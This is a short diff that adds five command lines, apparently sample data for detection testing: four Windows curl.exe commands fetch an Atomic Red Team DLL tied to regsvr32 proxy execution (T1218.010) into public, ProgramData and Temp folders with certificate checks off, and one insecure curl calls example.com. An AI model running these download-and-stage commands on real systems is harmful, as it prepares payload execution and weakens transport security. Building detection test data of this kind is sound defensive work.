@@ -1,0 +1,5 @@
+C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll
+C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll
+C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll
+C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\thaim\AppData\Local\Temp\allthethingsx64.dll
+curl  --insecure http://example.com
